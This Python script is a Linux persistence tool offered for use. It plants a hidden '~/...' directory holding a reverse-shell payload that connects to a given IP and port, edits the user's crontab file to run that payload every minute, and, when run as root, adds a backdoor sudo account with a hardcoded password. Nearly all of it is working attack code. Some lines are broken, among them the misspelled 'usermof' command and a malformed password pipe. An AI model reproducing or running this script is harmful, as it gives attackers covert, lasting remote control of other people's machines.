import sys, os, subprocess

class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class funcs:
    def __init__(self):
        pass

    def check_version(self):
        if sys.version_info[0] < 3:
            print("[!] Python 3.x is required to run this script.")
            sys.exit(1)

    def print_help(self):
        print("""Usage: python3 setup_persistence_local.py <ip> <port>
        Example: python3 setup_persistence_local.py 127.0.0.1 4444
        
        Note: This script will only work on Linux systems. 
        The ip and port must be valid and they are for the reverse shell in the crontab""")
    
    def find_crontab_file(self, search_str, rootdirs):

        for dirr in rootdirs:
            for folder, dirs, files in os.walk(dirr):
                for file in files:
                    try:
                        fullpath = os.path.join(folder, file)
                        with open(fullpath, 'r') as f:
                            for line in f:
                                if search_str in line:
                                    return fullpath
                    except:
                        pass

    def crontab(self, ip, port):
        output = subprocess.run(['which','crontab'], check=True, stdout=subprocess.PIPE).stdout
        crontab_path = output.decode('utf-8').strip()
        if not os.path.isfile(crontab_path):
            print("[!] Crontab not found.")
            return
        else:
            curr = subprocess.run([crontab_path, '-l'], check=True, stdout=subprocess.PIPE).stdout
            print(f"{bcolors.GREEN}[+] Current crontabs:{bcolors.ENDC}\n\n{curr.decode('utf-8')}" if curr else f"{bcolors.BLUE}[+] No crontabs found.{bcolors.ENDC}")
            if curr:
                filename = self.find_crontab_file(curr.decode('utf-8')[0:20], ["/var/", "/etc/", "/home/"])
                if not filename:
                    print(f"{bcolors.WARNING}[!] Crontab file not found.{bcolors.ENDC}")
                    return

                print(f"{bcolors.GREEN}[+] Crontab file found: {filename}{bcolors.ENDC}")
                print(f"{bcolors.GREEN}[+] Creating per.py file...{bcolors.ENDC}")

                subprocess.run(['mkdir', f'{os.environ["HOME"]}/...'], check=True, stdout=subprocess.DEVNULL)
                with open(f'{os.environ["HOME"]}/.../per.py', 'w') as f:
                    f.write(f"""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);""")

                print(f"{bcolors.GREEN}[+] Adding persistence to crontab file...{bcolors.ENDC}")
                with open(filename, 'w') as f:
                    f.write(curr.decode('utf-8') + f'\n* * * * * python3 {os.environ["HOME"]}/.../per.py\n')

                print(f"{bcolors.GREEN}[+] Done adding crontab.{bcolors.ENDC}")

    def create_local_account(username, password):
        print(f"{bcolors.GREEN}[+] Creating local account...{bcolors.ENDC}")
        subprocess.run(['useradd', '-m', '-s', '/bin/bash', username], check=True, stdout=subprocess.DEVNULL)
        subprocess.run(['usermof', '-aG', 'sudo', username], check=True, stdout=subprocess.DEVNULL)
        subprocess.run(['echo', f"'{password}'", '|', 'passwd', username, '--stdin'], check=True, stdout=subprocess.DEVNULL)
        print(f"{bcolors.GREEN}[+] Done creating local account {username}:{password}.{bcolors.ENDC}")

class user:
    def __init__(self, ip, port, user_name):
        self.ip = ip
        self.port = port
        self.username = user_name

        funcs().crontab(self.ip, self.port)

class root:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

        funcs().crontab(self.ip, self.port)
        funcs().create_local_account('kei', 'ILikeYouSoMuch<3')


if __name__ == '__main__':

    funcs().check_version()

    try:
        ip = sys.argv[1]
        port = sys.argv[2]

        if ip == '-h' or ip == '--help':
            funcs().print_help()
            sys.exit(0)
    except IndexError:
        funcs().print_help()
        sys.exit(1)
    
    if os.geteuid() == 0:
        root(ip, port)
    else:
        user(ip, port, os.getlogin())